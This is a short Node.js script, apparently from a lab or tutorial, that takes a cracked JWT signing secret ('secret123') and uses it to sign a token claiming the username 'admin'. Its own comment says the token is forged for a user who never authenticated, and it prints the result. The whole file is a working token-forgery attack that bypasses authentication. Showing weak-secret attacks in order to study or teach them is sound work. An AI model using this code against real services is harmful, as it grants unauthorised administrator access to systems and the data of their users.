const jwt = require("jsonwebtoken");

const crackedSecret = "secret123";

// Forge a token for a user that was never authenticated
const forgedToken = jwt.sign({ username: "admin" }, crackedSecret);

console.log("Forged token:\n", forgedToken);
